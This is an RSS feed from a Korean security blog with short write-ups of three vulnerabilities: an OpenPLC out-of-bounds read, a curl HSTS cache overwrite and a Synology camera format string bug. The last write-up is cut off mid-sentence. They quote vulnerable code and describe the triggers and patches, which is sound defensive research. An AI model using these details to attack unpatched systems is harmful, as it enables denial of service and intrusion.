<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>hackyboiz</title>
    <link>https://hackyboiz.github.io/</link>
    
    <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>hack &amp; life</description>
    <pubDate>Wed, 13 Nov 2024 07:50:42 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[하루한줄] CVE-2024-36980: OpenPLC의 EtherNet/IP PCCC 파서 기능에서 발견된 OOB Read 취약점</title>
      <link>https://hackyboiz.github.io/2024/11/13/ogu123/cve-2024-36980/</link>
      <guid>https://hackyboiz.github.io/2024/11/13/ogu123/cve-2024-36980/</guid>
      <pubDate>Wed, 13 Nov 2024 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.talosintelligence.com/vulnerability_reports/T</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.talosintelligence.com/vulnerability_reports/TALOS-2024-2004">https://www.talosintelligence.com/vulnerability_reports/TALOS-2024-2004</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>OpenPLC _v3 b4702061dc14d1024856f71b4543298d77007b88</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>OpenPLC&#xB294; &#xC800;&#xBE44;&#xC6A9; &#xC0B0;&#xC5C5; &#xC790;&#xB3D9;&#xD654;&#xC640; &#xC5F0;&#xAD6C;&#xB97C; &#xC704;&#xD55C; &#xC194;&#xB8E8;&#xC158;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xBA70; &#xC8FC;&#xB85C; &#xC0B0;&#xC5C5; &#xBCF4;&#xC548; &#xC5F0;&#xAD6C;&#xC5D0; &#xD65C;&#xC6A9;&#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC9C0;&#xC6D0;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xBA85;&#xB839;/&#xD568;&#xC218; &#xC30D;&#xC774; &#xD3EC;&#xD568;&#xB41C; PCCC &#xC694;&#xCCAD;&#xC774; &#xCEE8;&#xD2B8;&#xB864;&#xB7EC; &#xB0B4;&#xC5D0;&#xC11C; <code>-1</code> &#xAC12;&#xC744; &#xB9AC;&#xD134;&#xD558;&#xBA74;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs arduino"><span class="hljs-comment">/* Determine the Command that is being requested to execute */</span><span class="hljs-function"><span class="hljs-keyword">uint16_t</span> <span class="hljs-title">Command_Protocol</span><span class="hljs-params">(pccc_header header, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *<span class="hljs-built_in">buffer</span>, <span class="hljs-keyword">int</span> buffer_size)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">uint16_t</span> var_pccc_length;    <span class="hljs-comment">/*If Statement to determine the command code from the Command Packet*/</span>    <span class="hljs-keyword">if</span>(((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)*header.HD_CMD_Code == <span class="hljs-number">0x0f</span>) &amp;&amp; ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)*header.HD_Data_Function_Code == <span class="hljs-number">0xA2</span>))<span class="hljs-comment">//Protected Logical Read</span>    {        var_pccc_length = Protected_Logical_Read_Reply(header,<span class="hljs-built_in">buffer</span>,buffer_size);        <span class="hljs-keyword">return</span> var_pccc_length;    }    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)*header.HD_CMD_Code == <span class="hljs-number">0x0f</span>) &amp;&amp; ( ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)*header.HD_Data_Function_Code == <span class="hljs-number">0xAA</span>) || ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)*header.HD_Data_Function_Code == <span class="hljs-number">0xAB</span>)))<span class="hljs-comment">//Protected Logical Write</span>    {        var_pccc_length = Protected_Logical_Write_Reply(header,<span class="hljs-built_in">buffer</span>,buffer_size);        <span class="hljs-keyword">return</span> var_pccc_length;    }    <span class="hljs-keyword">else</span>    {        <span class="hljs-comment">/*initialize logging system*/</span>        <span class="hljs-keyword">char</span> log_msg[<span class="hljs-number">1000</span>];        <span class="hljs-built_in">sprintf</span>(log_msg, <span class="hljs-string">&quot;PCCC: Unsupportedd Command/Data Function Code!\n&quot;</span>);        <span class="hljs-built_in">log</span>(log_msg);         <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    }<span class="hljs-comment">//return length as -1 to signify that the CMD Code/Function Code was not recognize</span>}</code></pre><p><code>Command_Protocol</code> &#xD568;&#xC218;&#xB294; <code>*header.HD_CMD_Code</code> &#xC640; <code>*header.HD_Data_Function_Code</code> &#xAC12;&#xC744; &#xD1B5;&#xD574; PCCC &#xC694;&#xCCAD;&#xC774; &#xC62C;&#xBC14;&#xB978; &#xBA85;&#xB839;&#xACFC; &#xD568;&#xC218; &#xCF54;&#xB4DC;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC84C;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.<br>&#xB9CC;&#xC57D;, &#xC9C0;&#xC6D0;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xBA85;&#xB839; &#xB610;&#xB294; &#xD568;&#xC218; &#xCF54;&#xB4DC;&#xC77C; &#xACBD;&#xC6B0; &#xB85C;&#xADF8; &#xBA54;&#xC2DC;&#xC9C0;&#xC640; &#xD568;&#xAED8; <code>-1</code> &#xAC12;&#xC744; &#xB9AC;&#xD134;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs haxe"><span class="hljs-comment">//send pccc Data to pccc.cpp to be parsed and craft response</span><span class="hljs-comment">// returns the new PCCC data size</span>uint16_t <span class="hljs-keyword">new</span><span class="hljs-type">PcccSize</span> = processPCCCMessage(pcccData, currentPcccSize);<span class="hljs-keyword">if</span> (<span class="hljs-keyword">new</span><span class="hljs-type">PcccSize</span> == <span class="hljs-number">-1</span>)<span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<span class="hljs-comment">//error in PCCC.cpp</span></code></pre><p><code>Command_Protocol</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xB9AC;&#xD134;&#xB41C; <code>-1</code> &#xAC12;&#xC740; <code>ParsePCCCData</code>&#xC640;<code>processPCCCMessage</code>&#xD568;&#xC218;&#xB97C; &#xAC70;&#xCCD0; newPcccSize &#xBCC0;&#xC218; &#xAC12;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. </p><p>&#xC774;&#xB54C;, newPcccSize &#xBCC0;&#xC218; &#xD0C0;&#xC785;&#xC774; uint16_t&#xC774;&#xBBC0;&#xB85C; <code>-1</code> &#xAC12;&#xC774; <code>0xFFFF</code> &#xAC12;&#xC73C;&#xB85C; &#xD574;&#xC11D;&#xB418;&#xC5B4; if &#xBB38;&#xC744; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs angelscript"><span class="hljs-built_in">int</span> sendRRData(<span class="hljs-built_in">int</span> enipType,                struct enip_header *header,                struct enip_data_Unknown *enipDataUnknown,                struct enip_data_Unconnected *enipDataUnconnected,                struct enip_data_Connected *enipDataConnected){    <span class="hljs-keyword">if</span> (enipType == <span class="hljs-number">1</span>)    {        ...    }    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (enipType == <span class="hljs-number">2</span>)    {        ...        <span class="hljs-comment">//send pccc Data to pccc.cpp to be parsed and craft response</span>        <span class="hljs-comment">// returns the new PCCC data size</span>        <span class="hljs-built_in">uint</span>16_t newPcccSize = processPCCCMessage(pcccData, currentItem2Size - <span class="hljs-number">13</span>); <span class="hljs-comment">// get length of new pccc size</span>        <span class="hljs-keyword">if</span> (newPcccSize == <span class="hljs-number">-1</span>)                                                                                                                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<span class="hljs-comment">//error in PCCC.cpp</span>        ...                <span class="hljs-comment">//move data forward</span>        memmove(&amp;enipDataUnconnected-&gt;request_path[<span class="hljs-number">2</span>], enipDataUnconnected-&gt;requestor_idLength, newPcccSize + <span class="hljs-number">7</span>);<span class="hljs-comment">//11);</span>               ...    }</code></pre><p>CVE-2024-36980 &#xCDE8;&#xC57D;&#xC810;&#xC740; enipType&#xC774; 0x02&#xC778; sendRRData &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0BC; &#xACBD;&#xC6B0; &#xD2B8;&#xB9AC;&#xAC70; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>if &#xBB38; &#xC774;&#xD6C4; <code>memmove</code> &#xD568;&#xC218; &#xC138; &#xBC88;&#xC9F8; &#xB9E4;&#xAC1C; &#xBCC0;&#xC218;&#xB85C; newPcccSize + 0x7 &#xAC12;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xB370; &#xC138; &#xBC88;&#xC9F8; &#xB9E4;&#xAC1C; &#xBCC0;&#xC218; &#xD0C0;&#xC785;&#xC740; size_t&#xC774;&#xBBC0;&#xB85C; 0xFFFF + 0x7 = 0x10006 &#xAC12;&#xC774; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs angelscript"><span class="hljs-symbol">user@</span>machine:$ cat /proc/<span class="hljs-number">705332</span>/maps...ffffa4960000-ffffa5160000 rw-p <span class="hljs-number">00000000</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span> ffffa5160000-ffffa5170000 ---p <span class="hljs-number">00000000</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span> ...</code></pre><p><code>memmove</code> &#xD568;&#xC218; &#xC2E4;&#xD589; &#xC2DC; size &#xAC12;(0x10006)&#xC774; &#xBE44;&#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xCEE4;&#xC9C0;&#xBA74;&#xC11C; PCCC &#xC694;&#xCCAD; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC744; &#xB118;&#xB294; OOB Read&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xC678;&#xBD80; &#xC601;&#xC5ED;&#xC740; read &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>SIGSEV</code> &#xC624;&#xB958;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C;, &#xACF5;&#xACA9;&#xC790;&#xB294; PCCC &#xC694;&#xCCAD;&#xC744; &#xBC18;&#xBCF5;&#xC801;&#xC73C;&#xB85C; &#xBCF4;&#xB0B4; DoS&#xB97C; &#xD2B8;&#xB9AC;&#xAC70; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>CVE-2024-36981 &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xACBD;&#xC6B0; sendUnitData &#xD568;&#xC218;&#xC5D0;&#xC11C; newPcccSize &#xAC12; &#xAC80;&#xC99D;&#xC744; &#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; CVE-2024-36980&#xACFC; &#xC720;&#xC0AC;&#xD558;&#xAC8C; &#xD2B8;&#xB9AC;&#xAC70; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/11/13/ogu123/cve-2024-36980/image1.png" alt></p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>-1</code> &#xAC12;&#xC744; <code>(uint16_t)-1</code>&#xB85C; &#xCE90;&#xC2A4;&#xD305;&#xD558;&#xC5EC; <code>newPcccSize</code>&#xC640; &#xD0C0;&#xC785;&#xC744; &#xC77C;&#xCE58;&#xC2DC;&#xD0A4;&#xB3C4;&#xB85D; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/OpenPLC/">OpenPLC</category>
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/OOB-Read/">OOB Read</category>
      
      <category domain="https://hackyboiz.github.io/tags/DoS/">DoS</category>
      
      
      <comments>https://hackyboiz.github.io/2024/11/13/ogu123/cve-2024-36980/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-9681: curl hsts cache overwrite 취약점</title>
      <link>https://hackyboiz.github.io/2024/11/10/l0ch/2024-11-10/</link>
      <guid>https://hackyboiz.github.io/2024/11/10/l0ch/2024-11-10/</guid>
      <pubDate>Sun, 10 Nov 2024 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://hackerone.com/reports/2764830&quot;&gt;https://hackerone.</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/2764830">https://hackerone.com/reports/2764830</a><br><a href="https://curl.se/docs/CVE-2024-9681.html">https://curl.se/docs/CVE-2024-9681.html</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>7.74.0 &#x2264; curl &#x2264; 8.10.1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>curl&#xC740; &#xB110;&#xB9AC; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xD1B5;&#xC2E0; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xC774;&#xC6A9;&#xD55C; data transfer tool&#xB85C;, HTTP, HTTPS, SCP, SFTP &#xBC0F; FTP&#xC640; &#xAC19;&#xC740; &#xB2E4;&#xC591;&#xD55C; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xBA70; Proxy, Header, Cookie &#xB4F1; &#xC694;&#xCCAD; &#xC138;&#xBD80; &#xC635;&#xC158;&#xAE4C;&#xC9C0; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xB294; commandline &#xAE30;&#xBC18; &#xD234;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; curl&#xC758; &#xCDE8;&#xC57D;&#xC810; CVE-2024-9681&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5B4; &#xAD00;&#xB828; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>curl&#xC740; &#xC548;&#xC804;&#xD558;&#xC9C0; &#xC54A;&#xC740; HTTP &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xB300;&#xC2E0; HTTPS &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xC811;&#xC18D;&#xD558;&#xB3C4;&#xB85D; &#xAC15;&#xC81C;&#xD558;&#xB294; <a href="https://everything.curl.dev/http/https/hsts.html">HSTS(HTTP Strict Transport Security)</a> &#xC635;&#xC158;&#xC744; &#xC9C0;&#xC6D0;&#xD569;&#xB2C8;&#xB2E4;. HSTS&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xB3C4;&#xBA54;&#xC778;&#xC740; &#xC751;&#xB2F5; &#xC2DC; <code>Strict-Transport-Security</code>  &#xD5E4;&#xB354;&#xC5D0; &#xD574;&#xB2F9; HSTS &#xC815;&#xCC45; &#xB9CC;&#xB8CC; &#xAE30;&#xAC04;&#xC744; &#xD3EC;&#xD568;&#xD558;&#xB294;&#xB370;, curl&#xC740; &#xC774;&#xB7EC;&#xD55C; &#xC751;&#xB2F5;&#xC744; HSTS &#xCE90;&#xC2DC; &#xD30C;&#xC77C;&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB7EC;&#xD55C; HSTS&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xC774;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>&#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; HTTP &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xB294; &#xACBD;&#xC6B0; &#xC11C;&#xBC84; &#xB808;&#xBCA8;&#xC5D0;&#xC11C; 301/032 &#xB9AC;&#xB514;&#xB809;&#xC158;&#xC744; &#xD1B5;&#xD574; HTTPS&#xB85C; &#xB118;&#xC5B4;&#xAC00;&#xB098;, HSTS &#xCE90;&#xC2DC;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xBA74; &#xCE90;&#xC2DC;&#xC5D0; &#xC9C0;&#xC815;&#xB41C; &#xB9CC;&#xB8CC; &#xAE30;&#xAC04; &#xB3D9;&#xC548; &#xD574;&#xB2F9; &#xB3C4;&#xBA54;&#xC778;&#xC5D0; &#xB300;&#xD55C; HTTP &#xC694;&#xCCAD;&#xC740; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xB808;&#xBCA8;&#xC5D0;&#xC11C; HTTPS&#xB85C; &#xBCC0;&#xACBD;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBD88;&#xD544;&#xC694;&#xD55C; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xD2B8;&#xB798;&#xD53D;&#xC744; &#xC904;&#xC77C; &#xC218; &#xC788;&#xC74C;.</li><li>MITM&#xACFC; &#xAC19;&#xC740; HTTP &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xD1B5;&#xD55C; &#xACF5;&#xACA9;&#xC744; &#xC0AC;&#xC804;&#xC5D0; &#xBC29;&#xC9C0;&#xD560; &#xC218; &#xC788;&#xC74C;.</li></ul><p>HSTS&#xB294; &#xCCAB; &#xC694;&#xCCAD; &#xC2DC; Strict-Transport-Seuciry &#xC751;&#xB2F5; &#xD5E4;&#xB354;&#xB97C; &#xD655;&#xC778;&#xD558;&#xAE30; &#xC804; &#xACF5;&#xACA9;&#xC744; &#xD1B5;&#xD574; &#xBB34;&#xB825;&#xD654;&#xB420; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xB2E8;&#xC810;&#xC774; &#xC788;&#xC73C;&#xB098;, &#xC774;&#xB294; HSTS &#xC815;&#xCC45;&#xC744; &#xC0AC;&#xC804; &#xB4F1;&#xB85D;&#xD558;&#xB294; HSTS Preload&#xC73C;&#xB85C; &#xD574;&#xACB0;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xC11C;&#xBE0C;&#xB3C4;&#xBA54;&#xC778;&#xC740; &#xBD80;&#xBAA8; &#xB3C4;&#xBA54;&#xC778;&#xC758; HSTS &#xB9CC;&#xB8CC; &#xC2DC;&#xAC04;&#xC744; &#xB298;&#xB9B4; &#xC218;&#xB9CC; &#xC788;&#xACE0; &#xC904;&#xC77C; &#xC218; &#xC5C6;&#xC5B4; &#xC545;&#xC131; &#xC11C;&#xBE0C;&#xB3C4;&#xBA54;&#xC778;&#xC5D0; &#xC758;&#xD574; &#xBD80;&#xBAA8; &#xB3C4;&#xBA54;&#xC778;&#xC774; &#xBC1B;&#xB294; &#xC601;&#xD5A5;&#xC744; &#xC81C;&#xD55C;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; 8.10.1 &#xBC84;&#xC804; &#xC774;&#xD558;&#xC758; curl&#xC740; &#xC11C;&#xBE0C;&#xB3C4;&#xBA54;&#xC778;&#xC774; &#xBD80;&#xBAA8;&#xB3C4;&#xBA54;&#xC778; HSTS &#xCE90;&#xC2DC;&#xB97C; &#xB36E;&#xC5B4;&#xC368; &#xB9CC;&#xB8CC; &#xC2DC;&#xAC04;&#xC744; &#xC904;&#xC77C; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xBD80;&#xBAA8;&#xB3C4;&#xBA54;&#xC778; domain.com &#xBC0F; &#xC11C;&#xBE0C;&#xB3C4;&#xBA54;&#xC778; sub.domain.com&#xC758; HSTS &#xCE90;&#xC2DC; &#xC608;&#xC2DC;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">.domain.com <span class="hljs-string">&quot;20241107 01:02:03&quot;</span>.sub.domain.com <span class="hljs-string">&quot;unlimited&quot;</span></code></pre><p>&#xC77C;&#xC815; &#xAE30;&#xAC04;&#xC774; &#xC9C0;&#xB098;&#xBA74; HSTS &#xC815;&#xCC45;&#xC774; &#xC0C8;&#xB85C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB418;&#xB294;&#xB370;, sub.domain.com&#xC758; &#xC751;&#xB2F5;&#xC774; <code>Strict-Transport-Security: max-age=15768000 ; includeSubDomains</code> &#xC778; &#xACBD;&#xC6B0; cache&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">.domain.com <span class="hljs-string">&quot;unlimited&quot;</span>.sub.domain.com <span class="hljs-string">&quot;20250408 00:26:19&quot;</span></code></pre><p>&#xC11C;&#xBE0C;&#xB3C4;&#xBA54;&#xC778;&#xC740; &#xC815;&#xC0C1;&#xC801;&#xC778; &#xB9CC;&#xB8CC; &#xAE30;&#xAC04;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xB418;&#xC5C8;&#xC73C;&#xB098; &#xBD80;&#xBAA8;&#xB3C4;&#xBA54;&#xC778;&#xC740; &#xC774;&#xC804; &#xC11C;&#xBE0C;&#xB3C4;&#xBA54;&#xC778;&#xC758; &#xB9CC;&#xB8CC; &#xAE30;&#xAC04;&#xC73C;&#xB85C; overwrite &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; curl&#xC774; HSTS &#xCE90;&#xC2DC;&#xB97C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xB3C4;&#xBA54;&#xC778; &#xB9E4;&#xCE6D;&#xC744; &#xB290;&#xC2A8;&#xD558;&#xAC8C; &#xAD6C;&#xD604;&#xD574;&#xC11C; &#xBC1C;&#xC0DD;&#xD588;&#xC73C;&#xBA70;, &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xB294; &#xACBD;&#xC6B0; HSTS&#xAC00; &#xC608;&#xC0C1;&#xBCF4;&#xB2E4; &#xBE68;&#xB9AC; &#xB9CC;&#xB8CC;&#xB418;&#xC5B4; &#xBBFC;&#xAC10;&#xD55C; &#xC815;&#xBCF4;&#xAC00; HTTP&#xB97C; &#xD1B5;&#xD574; &#xC804;&#xC1A1;&#xB418;&#xAC70;&#xB098; &#xB9AC;&#xB514;&#xB809;&#xC158; &#xC694;&#xCCAD;&#xB7C9;&#xC774; &#xC99D;&#xAC00;&#xD574; &#xBC1C;&#xC0DD;&#xD558;&#xB294; DoS&#xC758; &#xC6D0;&#xC778;&#xC774; &#xB420;  &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>curl&#xC740; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD55C; <a href="https://github.com/curl/curl/commit/a94973805df96269bf#diff-92cb51f57e15a16ca654bafdae501a978fb94cdf4aab06ea5cb1e95395044693R281">&#xD328;&#xCE58;</a>&#xB85C; &#xC804;&#xCCB4; &#xB3C4;&#xBA54;&#xC778;&#xC774; &#xC77C;&#xCE58;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xC5D0;&#xB9CC; &#xAE30;&#xC874; HSTS &#xCE90;&#xC2DC; &#xD56D;&#xBAA9;&#xC744; &#xAD50;&#xCCB4;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xCD94;&#xAC00;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/11/10/l0ch/2024-11-10/image01.png" alt="image.png"></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/curl/">curl</category>
      
      <category domain="https://hackyboiz.github.io/tags/hsts/">hsts</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve-2024-9681/">cve-2024-9681</category>
      
      
      <comments>https://hackyboiz.github.io/2024/11/10/l0ch/2024-11-10/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Synology-SA-24:17: Synology Camera의 Format String Bug로 인한 원격 코드 실행 취약점</title>
      <link>https://hackyboiz.github.io/2024/11/06/pwndorei/2024-11-06/</link>
      <guid>https://hackyboiz.github.io/2024/11/06/pwndorei/2024-11-06/</guid>
      <pubDate>Wed, 06 Nov 2024 13:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.synacktiv.com/publications/exploiting-a-blind</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.synacktiv.com/publications/exploiting-a-blind-format-string-vulnerability-in-modern-binaries-a-case-study-from">https://www.synacktiv.com/publications/exploiting-a-blind-format-string-vulnerability-in-modern-binaries-a-case-study-from</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>TC500, BC500, CC400W Firmware &lt; 1.1.3-0442</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Synology&#xC758; &#xBCF4;&#xC548; &#xCE74;&#xBA54;&#xB77C; &#xC81C;&#xD488;&#xC778; TC500, BC500, CC400W&#xC758; &#xD38C;&#xC6E8;&#xC5B4;&#xC5D0;&#xC11C; HTTP &#xC694;&#xCCAD;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xACFC;&#xC815; &#xC911; Format String Bug&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC5EC; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xD55C; &#xCF54;&#xB4DC;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">parse_http_request</span><span class="hljs-params">(struct mg_request_info *conn)</span> </span>{    <span class="hljs-keyword">pthread_t</span> tid;    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x80</span>];    <span class="hljs-comment">/* [...] */</span>    tid = pthread_self();    <span class="hljs-comment">/* [...] */</span>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));    mg_snprintf(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, buf, <span class="hljs-number">0x80</span>u, <span class="hljs-string">&quot;%s%s&quot;</span>, hostname, conn-&gt;request_uri);  <span class="hljs-comment">//[1]</span>    <span class="hljs-keyword">if</span> ( debug_table ) {        print_debug_msg(tid, buf);  <span class="hljs-comment">//[2]</span>    }    <span class="hljs-comment">/* [...] */</span>}</code></pre><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xD3EC;&#xB9F7; &#xC2A4;&#xD2B8;&#xB9C1;&#xC744; uri&#xC5D0; &#xD3EC;&#xD568;&#xC2DC;&#xD0A8; HTTP &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; 